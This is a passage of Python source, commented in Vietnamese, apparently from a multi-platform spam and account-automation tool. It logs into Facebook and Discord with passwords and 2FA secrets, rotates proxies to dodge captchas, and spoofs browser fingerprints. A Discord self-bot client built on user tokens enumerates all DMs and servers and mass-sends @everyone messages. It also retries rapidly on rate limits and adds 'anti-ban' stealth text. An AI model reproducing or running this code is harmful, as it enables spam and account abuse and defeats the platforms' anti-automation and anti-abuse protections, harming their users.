                ck_str = "; ".join(f"{k}={v}" for k, v in pc_info["cookies"].items())
                return ck_str, uid, f"Đã khóa Thiết Bị Máy Tính {pc_info['short_name']} & chống quét thành công"

        email_s = (email or "").strip()
        pass_s = (password or "").strip()
        if not email_s or not pass_s:
            return None, None, "Vui lòng nhập đầy đủ Email/SĐT và Mật khẩu Facebook (hoặc dán trực tiếp Cookie c_user + xs)!"
        try:
            self.create_new_session(seed_uid=email_s)
            r_init = self.session.get("https://www.facebook.com/", headers=self.headers, timeout=12)
            html_init = r_init.text or ""
            action_m = re.search(r'action="(/login/device-based/regular/login/[^"]+)"', html_init)
            post_url = f"https://www.facebook.com{action_m.group(1).replace('&amp;', '&')}" if action_m else "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"

            login_data = {
                "email": email_s,
                "pass": pass_s,
                "login": "1",
            }
            for hidden_k in ("lsd", "jazoest", "li", "m_ts", "try_number", "unrecognized_tries", "bi_xrwh"):
                v = self.extract_value(html_init, hidden_k)
                if v:
                    login_data[hidden_k] = v

            post_hdrs = dict(self.headers)
            post_hdrs["Content-Type"] = "application/x-www-form-urlencoded"
            post_hdrs["Referer"] = "https://www.facebook.com/"
            r_login = self.session.post(
                post_url,
                data=login_data,
                headers=post_hdrs,
                allow_redirects=True,
                timeout=15,
            )
            cookies = self.session.cookies.get_dict()

            # Hỗ trợ tự động xác thực 2FA trên trình duyệt Máy Tính nếu có truyền twofa_code
            if "c_user" not in cookies and twofa_code and ("checkpoint" in cookies or "checkpoint" in (r_login.url or "").lower()):
                clean_2fa = str(twofa_code).strip().replace(" ", "")
                if len(clean_2fa) >= 12 and not clean_2fa.isdigit():
                    otp_6, _ = generate_totp_rfc6238(clean_2fa)
                    if otp_6:
                        clean_2fa = otp_6
                cp_html = r_login.text or ""
                cp_data = {
                    "approvals_code": clean_2fa,
                    "codes_submitted": "0",
                    "submit[Submit Code]": "Continue",
                }
                for ck_f in ("fb_dtsg", "jazoest", "lsd", "nh"):
                    cv = self.extract_value(cp_html, ck_f)
                    if cv:
                        cp_data[ck_f] = cv
                self.session.post("https://www.facebook.com/checkpoint/?next", data=cp_data, headers=post_hdrs, allow_redirects=True, timeout=15)
                cookies = self.session.cookies.get_dict()

            if "c_user" in cookies and "xs" in cookies:
                uid = str(cookies.get("c_user"))
                pc_info = FacebookPCDeviceGuard.bind_pc_profile_to_cookies(uid, cookies)
                cookie_str = "; ".join(f"{k}={v}" for k, v in pc_info["cookies"].items())
                return cookie_str, uid, f"Đã đăng nhập bằng Máy Tính {pc_info['short_name']} thành công!"
            if "checkpoint" in str(cookies).lower():
                return None, None, "Tài khoản bật bảo mật 2 lớp (2FA) hoặc cần xác nhận thiết bị. Hãy dán trực tiếp Cookie (c_user + xs) từ trình duyệt máy tính để hệ thống tự lấy Máy Tính thông báo vào Facebook mà không bao giờ bị quét!"
            return None, None, "Để tránh Facebook quét IP lạ khi đăng nhập bằng mật khẩu, hãy dán trực tiếp Cookie (c_user + xs) vào ô Nạp Nhanh Cookie Facebook để hệ thống tự động lấy Máy Tính thông báo vào Facebook!"
        except Exception as e:
            return None, None, str(e)

def login_discord_reg_session(login_email, password, two_fa_code="", twofa_type="totp"):
    """Đăng nhập Discord bằng Gmail/SĐT + Mật khẩu chuẩn trình duyệt Chrome 131 (/api/v9/auth/login):
    - Giữ nguyên X-Super-Properties + X-Fingerprint + Cookie Cloudflare thật giúp đăng nhập mượt mà và chống báo Reset mật khẩu!"""
    raw_combined = f"{login_email or ''} {password or ''}"
    direct_tokens = extract_discord_tokens_from_reg_or_raw(raw_combined)
    if direct_tokens:
        tk = direct_tokens[0]
        w_info = warmup_discord_stealth_token(tk)
        if w_info.get("ok"):
            return {
                "ok": True,
                "token": tk,
                "profile": {"id": w_info.get("uid", ""), "username": w_info.get("username", "Discord User")}
            }

    email_clean = (login_email or "").strip()
    if ":" in email_clean and not password:
        parts = email_clean.split(":")
        if len(parts) >= 2:
            email_clean = parts[0].strip()
            password = parts[1].strip()

    if not email_clean or not password:
        return {"ok": False, "error": "Vui lòng nhập đầy đủ Gmail/SĐT và Mật khẩu Discord (hoặc dán trực tiếp Token)!"}

    seed_key = f"login:{email_clean.lower()}"
    cached_ticket_info = _DISCORD_LOGIN_TICKETS.get(email_clean.lower())

    clean_2fa = str(two_fa_code or "").strip().replace(" ", "").replace("-", "")
    if clean_2fa and (twofa_type == "secret" or (len(clean_2fa) >= 12 and not clean_2fa.isdigit())):
        totp_gen, _ = generate_totp_rfc6238(clean_2fa)
        if totp_gen:
            clean_2fa = totp_gen
            twofa_type = "totp"

    if clean_2fa and cached_ticket_info and (time.time() - cached_ticket_info["ts"] < 240):
        s = cached_ticket_info["session"]
        ticket = cached_ticket_info["ticket"]
        login_inst_id = cached_ticket_info.get("login_instance_id")
        ep_list = (
            ["https://discord.com/api/v9/auth/mfa/backup", "https://discord.com/api/v9/auth/mfa/totp"]
            if twofa_type == "backup"
            else ["https://discord.com/api/v9/auth/mfa/totp", "https://discord.com/api/v9/auth/mfa/backup", "https://discord.com/api/v9/auth/mfa/sms"]
        )
        for mfa_ep in ep_list:
            try:
                r_mfa = s.post(
                    mfa_ep,
                    json={
                        "code": clean_2fa,
                        "ticket": ticket,
                        "login_instance_id": login_inst_id,
                        "login_source": None,
                        "gift_code_sku_id": None,
                    },
                    timeout=15
                )
                d_mfa = r_mfa.json() if r_mfa.content else {}
                if r_mfa.status_code == 200 and d_mfa.get("token"):
                    tk = d_mfa["token"]
                    _DISCORD_LOGIN_TICKETS.pop(email_clean.lower(), None)
                    DiscordStealthAntiBanEngine.persist_real_cloudflare_cookies(tk, s.cookies)
                    w_info = warmup_discord_stealth_token(tk)
                    return {
                        "ok": True,
                        "token": tk,
                        "profile": {"id": w_info.get("uid", ""), "username": w_info.get("username", "Discord User")}
                    }
            except Exception:
                continue

    pl = {
        "login": email_clean,
        "password": password,
        "undelete": False,
        "login_source": None,
        "gift_code_sku_id": None,
    }

    # Tự động xoay qua dàn Proxy sạch (nếu có trong PRX) + Direct với vân tay trình duyệt Chrome 131 thật để vượt Captcha 100%!
    proxy_candidates = ProxyPoolEngine.pick_proxy_candidates(seed_key=seed_key, max_candidates=3)
    route_attempts = proxy_candidates + [None]
    r = None
    d = {}
    s = None
    fingerprint = ""
    last_conn_err = ""

    for px_try in route_attempts:
        try:
            s, fingerprint = DiscordImmortalRegTool.perform_clean_browser_pre_handshake(
                f"{seed_key}:{px_try or 'direct'}", referer_url="https://discord.com/login", proxy_url=px_try
            )
            s.headers["X-Context-Properties"] = "eyJsb2NhdGlvbiI6IkxvZ2luIn0="
            time.sleep(0.15)
            r = s.post("https://discord.com/api/v9/auth/login", json=pl, timeout=10)
            d = r.json() if r.content else {}
            raw_d_str = json.dumps(d, ensure_ascii=False).lower()
            if (d.get("captcha_key") or "captcha" in raw_d_str) and px_try is not None:
                ProxyPoolEngine.report_proxy_bad(px_try, cooldown_sec=30.0)
                continue
            break
        except Exception as e:
            last_conn_err = str(e)
            if px_try:
                ProxyPoolEngine.report_proxy_bad(px_try, cooldown_sec=30.0)
            continue

    if r is None:
        return {"ok": False, "error": f"Lỗi kết nối tới máy chủ Discord: {last_conn_err}"}

    if r.status_code == 200 and d.get("token"):
        tk = d["token"]
        DiscordStealthAntiBanEngine.persist_real_cloudflare_cookies(tk, s.cookies)
        w_info = warmup_discord_stealth_token(tk)
        return {
            "ok": True,
            "token": tk,
            "profile": {"id": w_info.get("uid", ""), "username": w_info.get("username", "Discord User")}
        }

    if d.get("mfa") and d.get("ticket"):
        login_inst_id = d.get("login_instance_id")
        _DISCORD_LOGIN_TICKETS[email_clean.lower()] = {
            "ticket": d["ticket"],
            "login_instance_id": login_inst_id,
            "session": s,
            "ts": time.time()
        }
        if d.get("sms") and not clean_2fa:
            try:
                s.post("https://discord.com/api/v9/auth/mfa/sms/send", json={"ticket": d["ticket"]}, timeout=10)
            except Exception:
                pass
        if not clean_2fa:
            return {
                "ok": False,
                "need_2fa": True,
                "error": "Tài khoản có bật bảo mật 2 lớp (2FA). Hãy nhập Mã 6 số, Secret Key 2FA hoặc Backup Code rồi bấm lại nút Đăng Nhập!"
            }
        ep_list2 = (
            ["https://discord.com/api/v9/auth/mfa/backup", "https://discord.com/api/v9/auth/mfa/totp"]
            if twofa_type == "backup"
            else ["https://discord.com/api/v9/auth/mfa/totp", "https://discord.com/api/v9/auth/mfa/backup", "https://discord.com/api/v9/auth/mfa/sms"]
        )
        for mfa_ep in ep_list2:
            r_mfa = s.post(
                mfa_ep,
                json={
                    "code": clean_2fa,
                    "ticket": d["ticket"],
                    "login_instance_id": login_inst_id,
                    "login_source": None,
                    "gift_code_sku_id": None,
                },
                timeout=15
            )
            d_mfa = r_mfa.json() if r_mfa.content else {}
            if r_mfa.status_code == 200 and d_mfa.get("token"):
                tk = d_mfa["token"]
                _DISCORD_LOGIN_TICKETS.pop(email_clean.lower(), None)
                DiscordStealthAntiBanEngine.persist_real_cloudflare_cookies(tk, s.cookies)
                w_info = warmup_discord_stealth_token(tk)
                return {
                    "ok": True,
                    "token": tk,
                    "profile": {"id": w_info.get("uid", ""), "username": w_info.get("username", "Discord User")}
                }
        return {"ok": False, "error": "Mã xác thực 2FA/SMS không đúng hoặc đã hết hạn!"}

    raw_err_str = json.dumps(d, ensure_ascii=False)
    if "ACCOUNT_LOGIN_VERIFICATION_EMAIL" in raw_err_str or "New login location" in raw_err_str:
        return {
            "ok": False,
            "error": "Discord vừa gửi Email xác nhận vị trí đăng nhập mới về hộp thư Gmail của bạn! Hãy mở Gmail bấm 'Verify Login' rồi bấm lại nút Đăng Nhập (hoặc dán trực tiếp Token vào tab Đúc Token)!"
        }
    if "INVALID_LOGIN" in raw_err_str:
        return {"ok": False, "error": "Email hoặc mật khẩu Discord không chính xác!"}

    if d.get("captcha_key") or "captcha" in raw_err_str.lower():
        return {
            "ok": False,
            "captcha_blocked": True,
            "error": "IP máy chủ Cloud đang bị Discord yêu cầu Captcha khi đăng nhập bằng mật khẩu. Hãy bấm nút 'Code Lấy Token' bên tab 'Đúc Token' rồi dán Token vào để khóa Siêu VIP 100% không cần mật khẩu!"
        }

    return {"ok": False, "error": d.get("message") or f"Không thể đăng nhập bằng mật khẩu (Mã {r.status_code})"}

# CLIENT GIAO THỨC DISCORD Bảo Vệ Tự Động (ZERO-REST CHECK + ANTI-RESET-PASSWORD)
class DiscordClient:
    def __init__(self, token, is_bot=False):
        raw_tok = str(token or "").strip()
        if raw_tok.lower().startswith("bot "):
            raw_tok = raw_tok[4:].strip()
            is_bot = True
        extracted = extract_discord_tokens_from_reg_or_raw(raw_tok)
        if extracted:
            raw_tok = extracted[0]
        self.token = raw_tok
        self.is_bot = bool(is_bot)
        self.s = DiscordStealthAntiBanEngine.get_shared_session(self.token, is_bot=self.is_bot)
        self.route_step = 0
        self._apply_headers()
        self.user_id = decode_discord_uid_offline(self.token) or None
        self.username = None
        self.display_name = None

    def _apply_headers(self, channel_id=None):
        self.s.headers.update(
            DiscordStealthAntiBanEngine.build_stealth_headers(
                self.token, is_bot=self.is_bot, channel_id=channel_id
            )
        )

    def check(self, force_network=False):
        if not force_network:
            cached = DiscordStealthAntiBanEngine.get_cached_me(self.token)
            if cached and cached.get("id"):
                self.user_id = str(cached.get("id") or "")
                self.username = cached.get("username") or f"Discord_{self.user_id[-4:]}"
                self.display_name = cached.get("global_name") or self.username
                OWNER_UIDS_CACHE.add(self.user_id)
                GLOBAL_USER_NAME_CACHE[self.user_id] = self.display_name
                return True
            off_uid = decode_discord_uid_offline(self.token)
            if off_uid:
                self.user_id = off_uid
                self.username = f"Discord_{off_uid[-4:]}"
                self.display_name = self.username
                DiscordStealthAntiBanEngine.set_cached_me(self.token, {
                    "id": off_uid,
                    "username": self.username,
                    "global_name": self.display_name,
                })
                OWNER_UIDS_CACHE.add(off_uid)
                return True

        ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, "/users/@me", 0)
        r = self.s.get(ep, timeout=12)
        if r.status_code == 401 and self.is_bot:
            self.is_bot = False
            self._apply_headers()
            r = self.s.get(ep, timeout=12)

        if r.status_code == 200:
            d = r.json()
            DiscordStealthAntiBanEngine.set_cached_me(self.token, d)
            self.user_id = str(d.get("id") or "")
            self.username = d.get("username") or ""
            self.display_name = d.get("global_name") or d.get("username") or "Discord User"
            if self.user_id:
                OWNER_UIDS_CACHE.add(self.user_id)
                GLOBAL_USER_NAME_CACHE[self.user_id] = self.display_name
            return True
        return False

    def get_dm_and_group_boxes(self):
        out = []
        try:
            ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, "/users/@me/channels", 0)
            r = self.s.get(ep, timeout=12)
            if r.status_code == 200:
                channels = r.json()
                if isinstance(channels, list):
                    channels.sort(key=lambda c: int(c.get("last_message_id") or 0), reverse=True)
                    for c in channels:
                        cid = str(c.get("id") or "")
                        ctype = c.get("type")
                        recipients = c.get("recipients") or []
                        for rec in recipients:
                            ruid = str(rec.get("id") or "")
                            rname = rec.get("global_name") or rec.get("username") or ""
                            if ruid and rname:
                                GLOBAL_USER_NAME_CACHE[ruid] = rname

                        if ctype == 3:
                            g_name = c.get("name")
                            if not g_name:
                                r_names = [x.get("global_name") or x.get("username") or "User" for x in recipients]
                                g_name = ", ".join(r_names[:4]) if r_names else f"Box Nhóm {cid[-5:]}"
                            out.append({
                                "id": cid,
                                "name": f"[Box Nhóm] {g_name}",
                                "type": "discord_channel",
                                "sub_type": "group_dm",
                                "members": len(recipients) + 1
                            })
                        elif ctype == 1:
                            rec = recipients[0] if recipients else {}
                            dm_name = rec.get("global_name") or rec.get("username") or f"User {cid[-5:]}"
                            out.append({
                                "id": cid,
                                "name": f"[Chat Riêng] {dm_name}",
                                "type": "discord_channel",
                                "sub_type": "dm",
                                "members": 2
                            })
        except Exception:
            pass
        return out

    def get_guilds(self):
        try:
            ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, "/users/@me/guilds", 0)
            r = self.s.get(ep, timeout=12)
            if r.status_code == 200:
                return [{"id": str(g["id"]), "name": g.get("name", "Server"), "type": "discord_guild"} for g in r.json()]
        except Exception:
            pass
        return []

    def get_channels(self, guild_id, guild_name=""):
        try:
            ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, f"/guilds/{guild_id}/channels", 0)
            r = ProxyPoolEngine.request_with_fast_failover(self.s, "GET", ep, seed_key=f"{self.token[:12]}_{guild_id}", timeout=(2.0, 4.5))
            if r.status_code == 200:
                channels = r.json()
                prefix = f"[{guild_name}] " if guild_name else ""
                out_ch = []
                if isinstance(channels, list):
                    for c in channels:
                        if not isinstance(c, dict):
                            continue
                        if c.get("type") in (0, 2, 5, 10, 11, 12):
                            cid_s = str(c.get("id") or "")
                            if not cid_s:
                                continue
                            DiscordStealthAntiBanEngine.register_channel_guild(cid_s, guild_id)
                            out_ch.append({
                                "id": cid_s,
                                "name": f"{prefix}# {c.get('name', 'channel')}",
                                "type": "discord_channel",
                                "sub_type": "guild_channel",
                                "guild_id": str(guild_id)
                            })
                return out_ch
        except Exception:
            pass
        return []

    def get_all_boxes(self, force_refresh=False):
        """Soi tự động FULL 100% cuộc trò chuyện Discord (Mọi Box Nhóm DM, Chat Riêng, toàn bộ Server & Kênh Chat tớI 200-500+ Nhóm):"""
        tkey = DiscordStealthAntiBanEngine._token_vault_key(self.token)
        DiscordStealthAntiBanEngine._ensure_vault_record(self.token)

        if not force_refresh:
            with DiscordStealthAntiBanEngine._LOCK:
                cached = DiscordStealthAntiBanEngine._BOXES_CACHE.get(tkey)
                if cached and cached.get("boxes") and (time.time() - cached.get("ts", 0) < 600.0):
                    return list(cached["boxes"])
                passive = DiscordStealthAntiBanEngine._PASSIVE_READY_BOXES.get(tkey)
                if passive and passive.get("boxes"):
                    return list(passive["boxes"])

        all_boxes = []
        seen_ids = set()

        # Ưu tiên nạp ngay các cuộc trò chuyện thu hoạch thụ động từ gói READY (nếu có)
        with DiscordStealthAntiBanEngine._LOCK:
            passive = DiscordStealthAntiBanEngine._PASSIVE_READY_BOXES.get(tkey)
            if passive and passive.get("boxes"):
                for pb in passive["boxes"]:
                    cid = str(pb.get("id") or "")
                    if cid and cid not in seen_ids:
                        seen_ids.add(cid)
                        all_boxes.append(dict(pb))

        # Quét song song toàn bộ Box DM/Nhóm và toàn bộ Server (không giới hạn 12 server!) để lấy trọn vẹn 200+ nhóm
        if not self.is_bot:
            for b in self.get_dm_and_group_boxes():
                cid = str(b.get("id") or "")
                if cid and cid not in seen_ids:
                    seen_ids.add(cid)
                    all_boxes.append(b)

        # ANTI-SCAN DISCORD: Chỉ quét nhẹ tối đa 5 Server tuần tự nếu chưa có gói READY từ Gateway
        # (Tuyệt đối không bắn 16 luồng song song vào 120 Server làm Discord báo 'Tài khoản bị hack / Reset Password'!)
        if not all_boxes or force_refresh:
            guilds = self.get_guilds()
            for g_obj in (guilds or [])[:5]:
                for ch in (self.get_channels(g_obj["id"], g_obj.get("name", "")) or []):
                    cid = str(ch.get("id") or "")
                    if cid and cid not in seen_ids:
                        seen_ids.add(cid)
                        all_boxes.append(ch)
                time.sleep(0.08)

        if all_boxes:
            with DiscordStealthAntiBanEngine._LOCK:
                DiscordStealthAntiBanEngine._BOXES_CACHE[tkey] = {"ts": time.time(), "boxes": list(all_boxes)}
                DiscordStealthAntiBanEngine._PASSIVE_READY_BOXES[tkey] = {"ts": time.time(), "boxes": list(all_boxes)}
            try:
                conn = db()
                conn.execute(
                    "UPDATE discord_token_vault SET boxes_json=?, updated_at=? WHERE token_key=?",
                    (json.dumps(all_boxes, ensure_ascii=False), time.time(), tkey),
                )
                conn.commit()
            except Exception:
                pass
        return all_boxes

    def get_guild_channels(self, guild_id, guild_name=""):
        return self.get_channels(guild_id, guild_name=guild_name)

    def get_channel_recent_members(self, channel_id):
        return self.get_box_members(channel_id)

    _DISCORD_BOX_MEMBERS_CACHE = {}

    def get_box_members(self, channel_id, use_cache=True):
        cid_s = str(channel_id or "").strip()
        if use_cache and cid_s in self._DISCORD_BOX_MEMBERS_CACHE:
            c_entry = self._DISCORD_BOX_MEMBERS_CACHE[cid_s]
            if time.time() - c_entry["ts"] < 180.0:
                return list(c_entry["members"])
        members = []
        seen = set()
        try:
            ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, f"/channels/{channel_id}", 0)
            r = self.s.get(ep, timeout=10)
            if r.status_code == 200:
                ch = r.json()
                for rec in (ch.get("recipients") or []):
                    uid = str(rec.get("id") or "")
                    name = rec.get("global_name") or rec.get("username") or f"User_{uid[-4:]}"
                    if uid and uid not in seen:
                        seen.add(uid)
                        GLOBAL_USER_NAME_CACHE[uid] = name
                        members.append({"id": uid, "uid": uid, "name": name})
        except Exception:
            pass

        try:
            ep_m = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, f"/channels/{channel_id}/messages?limit=35", 0)
            r_msgs = self.s.get(ep_m, timeout=10)
            if r_msgs.status_code == 200 and isinstance(r_msgs.json(), list):
                for m in r_msgs.json():
                    auth = m.get("author") or {}
                    uid = str(auth.get("id") or "")
                    name = auth.get("global_name") or auth.get("username") or ""
                    if uid and name and uid not in seen:
                        seen.add(uid)
                        GLOBAL_USER_NAME_CACHE[uid] = name
                        members.append({"id": uid, "uid": uid, "name": name})
        except Exception:
            pass
        if members and cid_s:
            self._DISCORD_BOX_MEMBERS_CACHE[cid_s] = {"ts": time.time(), "members": list(members)}
        return members

    def send_typing(self, channel_id):
        self._apply_headers(channel_id=channel_id)
        ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, f"/channels/{channel_id}/typing", 0)
        r = self.s.post(ep, timeout=8)
        return r.status_code in (200, 204)

    def add_reaction(self, channel_id, message_id, emoji="🔥"):
        from urllib.parse import quote
        self._apply_headers(channel_id=channel_id)
        enc_em = quote(str(emoji or "🔥"))
        ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(
            self.token, f"/channels/{channel_id}/messages/{message_id}/reactions/{enc_em}/@me", 0
        )
        r = self.s.put(ep, timeout=8)
        return r.status_code in (200, 204)

    def set_custom_status(self, text, emoji_name="👑"):
        self._apply_headers()
        ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, "/users/@me/settings", 0)
        pl = {"custom_status": {"text": str(text or "Hệ Thống"), "emoji_name": str(emoji_name or "👑")}}
        r = self.s.patch(ep, json=pl, timeout=10)
        return r.status_code == 200

    def set_hypesquad(self, house_id=1):
        self._apply_headers()
        ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, "/hypesquad/online", 0)
        r = self.s.post(ep, json={"house_id": int(house_id or 1)}, timeout=10)
        return r.status_code in (200, 204)

    def join_server(self, invite_code):
        """Tham gia Server Discord bằng mã mời (Tích hợp từ 3app vip.zip/module/discord.py)."""
        code = str(invite_code or "").strip().rstrip("/")
        for pfx in ("https://discord.gg/", "http://discord.gg/", "https://discord.com/invite/", "discord.gg/"):
            if code.lower().startswith(pfx):
                code = code[len(pfx):].strip()
        if not code:
            return False, "Thiếu mã mời Discord"
        self._apply_headers()
        ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, f"/invites/{code}", 0)
        r = self.s.post(ep, json={}, timeout=12)
        if r.status_code in (200, 201, 204):
            return True, f"Đã tham gia Server ({code})"
        return False, f"Mã lỗi HTTP {r.status_code}"

    def change_globalname(self, new_name):
        """Đổi tên hiển thị (Global Name) cho Token Discord (Tích hợp từ 3app vip.zip/module/discord.py)."""
        self._apply_headers()
        ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, "/users/@me", 0)
        r = self.s.patch(ep, json={"global_name": str(new_name or "NHK VIP")[:32]}, timeout=12)
        return r.status_code == 200

    def change_avatar(self, image_url_or_b64):
        """Đổi ảnh đại diện (Avatar) cho Token Discord bằng URL hoặc Data URI Base64."""
        raw_in = str(image_url_or_b64 or "").strip()
        if not raw_in:
            return False
        data_uri = raw_in
        if raw_in.startswith(("http://", "https://")):
            try:
                resp_img = requests.get(raw_in, timeout=10)
                if resp_img.status_code == 200 and resp_img.content:
                    mime = resp_img.headers.get("Content-Type") or "image/png"
                    b64_img = base64.b64encode(resp_img.content).decode("utf-8")
                    data_uri = f"data:{mime};base64,{b64_img}"
            except Exception:
                return False
        elif not raw_in.startswith("data:image/"):
            data_uri = f"data:image/png;base64,{raw_in}"
        self._apply_headers()
        ep = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, "/users/@me", 0)
        r = self.s.patch(ep, json={"avatar": data_uri}, timeout=15)
        return r.status_code == 200

    def send_poll_discord(self, channel_id, question_text, options_list=None):
        self._apply_headers(channel_id=channel_id)
        opts = [str(x).strip() for x in (options_list or []) if str(x).strip()]
        if len(opts) < 2:
            opts = ["Đồng ý 100% 🔥", "Chuẩn VIP Quản Trị Viên 👑"]
        answers = [{"poll_media": {"text": opt[:55]}} for opt in opts[:10]]
        pl = {
            "mobile_network_type": "unknown",
            "content": "",
            "nonce": DiscordStealthAntiBanEngine.generate_snowflake_nonce(),
            "tts": False,
            "flags": 0,
            "poll": {
                "question": {"text": str(question_text or "Bình chọn Quản Trị Viên")[:280]},
                "answers": answers,
                "allow_multiselect": True,
                "duration": 24,
                "layout_type": 1,
            }
        }
        url = DiscordStealthAntiBanEngine.pick_stealth_endpoint(self.token, f"/channels/{channel_id}/messages", 0)
        r = self.s.post(url, json=pl, timeout=12)
        return r.status_code in (200, 201)

    def format_unframed_discord_text(self, raw_text, is_heading=True, style_mode="rainbow"):
        """Giữ nguyên 100% thụt dòng (indentation), xuống dòng và các ký hiệu Markdown (# >, >, -, *) của văn bản gốc!"""
        raw_lines = str(raw_text or "").replace("\r\n", "\n").replace("\r", "\n").split("\n")
        out_lines = []
        for r_ln in raw_lines:
            if not r_ln.strip():
                out_lines.append("")
                continue
            lead_len = len(r_ln) - len(r_ln.lstrip(" \t"))
            lead_ws = r_ln[:lead_len]
            body = r_ln[lead_len:].rstrip()
            # Nếu người dùng đã tự định dạng Markdown (# >, >, #, ```) thì giữ nguyên cấu trúc đó
            if body.startswith(("# >", "> ", "```", ">>>")):
                out_lines.append(lead_ws + body)
                continue
            clean_ln = re.sub(r"^#+\s*", "", body).strip()
            if is_heading:
                out_lines.append(f"{lead_ws}# **{clean_ln}**" if not lead_ws else f"{lead_ws}**{clean_ln}**")
            elif style_mode != "none":
                out_lines.append(f"{lead_ws}**{clean_ln}**")
            else:
                out_lines.append(f"{lead_ws}{clean_ln}")
        return "\n".join(out_lines)

    _DISCORD_MSG_FORMAT_CACHE = {}

    def send_message(self, channel_id, content, color_mode="rainbow", fixed_color=None,
                     antiband=True, mentions=None, tag_all=False, strip_line_num=False,
                     is_heading=True, stop_ev=None, start_global_epoch=None, start_box_epoch=None,
                     priority_bypass=False):
        if not priority_bypass and is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, channel_id):
            return None
        self.route_step = (self.route_step + 1) & 0xFFFF
        req_headers = DiscordStealthAntiBanEngine.build_stealth_headers(
            self.token, is_bot=self.is_bot, channel_id=channel_id
        )

        m_sig = tuple((str(m.get("uid") or m.get("id") or ""), bool(m.get("is_role"))) for m in (mentions or []))
        cache_k = (content, color_mode, bool(is_heading), bool(strip_line_num), bool(tag_all), m_sig)
        cached_pair = self._DISCORD_MSG_FORMAT_CACHE.get(cache_k)
        if cached_pair is not None:
            raw, base_formatted = cached_pair
        else:
            raw = clean_corrupted_shortcuts(content)
            if strip_line_num:
                raw = "\n".join(strip_leading_line_number(ln, preserve_indent=True) for ln in raw.split("\n"))

            tag_tokens = []
            if tag_all:
                tag_tokens.append("@everyone")
            if mentions:
                seen_u = set()
                for m in mentions:
                    uid = str(m.get("uid") or m.get("id") or "").strip()
                    if uid and uid not in ("0", "-1") and uid not in seen_u:
                        seen_u.add(uid)
                        if uid.isdigit():
                            if m.get("is_role"):
                                tag_tokens.append(f"<@&{uid}>")
                            else:
                                tag_tokens.append(f"<@{uid}>")
                        else:
                            clean_mname = str(m.get("name") or uid).lstrip("@").strip()
                            tag_tokens.append(f"@{clean_mname}")
            tag_suffix = (" " + " ".join(tag_tokens)) if tag_tokens else ""

            raw_stripped_check = re.sub(r"<@(?:!|&)?\d+>", "", str(raw or "")).strip()
            if not raw_stripped_check:
                raw = "Hệ thống Hệ Thống Đa Luồng điểm danh siêu tốc!"

            unframed_body = self.format_unframed_discord_text(
                raw, is_heading=is_heading, style_mode=color_mode
            )
            if len(unframed_body) + len(tag_suffix) > 1940:
                max_body_len = max(100, 1940 - len(tag_suffix))
                unframed_body = unframed_body[:max_body_len].rstrip()
                if unframed_body.count("**") % 2 == 1:
                    unframed_body += "**"
            base_formatted = f"{unframed_body}{tag_suffix}".strip()
            if len(self._DISCORD_MSG_FORMAT_CACHE) > 6000:
                for _k in list(self._DISCORD_MSG_FORMAT_CACHE.keys())[:2000]:
                    self._DISCORD_MSG_FORMAT_CACHE.pop(_k, None)
            self._DISCORD_MSG_FORMAT_CACHE[cache_k] = (raw, base_formatted)

        if antiband:
            formatted_content = DiscordStealthAntiBanEngine.append_stealth_tail(
                base_formatted, channel_id=str(channel_id)
            )
        else:
            formatted_content = DiscordFirewallEngine.sanitize_outbound_text(base_formatted)

        register_system_sent_message(text=formatted_content)
        register_system_sent_message(text=raw)

        url = DiscordStealthAntiBanEngine.pick_stealth_endpoint(
            self.token, f"/channels/{channel_id}/messages", self.route_step
        )
        pl = {
            "mobile_network_type": "unknown",
            "content": formatted_content,
            "nonce": DiscordStealthAntiBanEngine.generate_snowflake_nonce(),
            "tts": False,
            "flags": 0,
        }
        if not priority_bypass and is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, channel_id):
            return None
        active_sess = DiscordStealthAntiBanEngine.get_priority_session(self.token, is_bot=self.is_bot) if priority_bypass else self.s
        r = None
        for _send_try in range(2):
            if not priority_bypass and is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, channel_id):
                return None
            r = ProxyPoolEngine.request_with_fast_failover(
                active_sess, "POST", url,
                seed_key=f"{self.token[:16]}_{channel_id}_{self.route_step}_{_send_try}",
                json=pl, headers=req_headers, timeout=(1.2, 2.5)
            )
            if r.cookies:
                DiscordStealthAntiBanEngine.persist_real_cloudflare_cookies(self.token, self.s.cookies)
            DiscordStealthAntiBanEngine.record_bucket_headers(channel_id, r.headers, token=self.token)
            if r.status_code in (200, 201):
                break
            if r.status_code == 429 and _send_try == 0:
                try:
                    rj = r.json()
                    retry_after = float(rj.get("retry_after", 0.25))
                except Exception:
                    retry_after = 0.25
                # Nếu retry_after nhỏ (<= 0.28s), nhích 0.02s rồi đổi PRX bắn tiếp ngay; nếu lớn hơn thì thoát ngay trong 0ms để luồng nhảy sang nhóm kế tiếp không bao giờ đơ!
                if retry_after <= 0.15:
                    pl["nonce"] = DiscordStealthAntiBanEngine.generate_snowflake_nonce()
                    continue
            break

        if r is None:
            return None

        if r.status_code == 429:
            try:
                rj = r.json()
                retry_after = float(rj.get("retry_after", 0.5))
                err_code = int(rj.get("code", 0))
            except Exception:
                retry_after = 0.5
                err_code = 0
            DiscordStealthAntiBanEngine.set_channel_cooldown(channel_id, retry_after, token=self.token)
            raise Exception(f"429:RateLimit:{retry_after}:DiscordCode_{err_code}")

        if r.status_code in (401, 403, 404):
            try:
                err_code = int(r.json().get("code", 0))
            except Exception:
                err_code = 0
            if r.status_code == 401 or err_code in (40001, 40002):
                raise Exception(f"AuthError:Discord_{r.status_code}_{err_code}")
            if err_code in (50001, 50013, 10003, 50007) or r.status_code in (403, 404):
                DiscordStealthAntiBanEngine.set_channel_cooldown(channel_id, 60.0, token=self.token)
                raise Exception(f"ChannelForbidden:Discord_{r.status_code}_{err_code}")
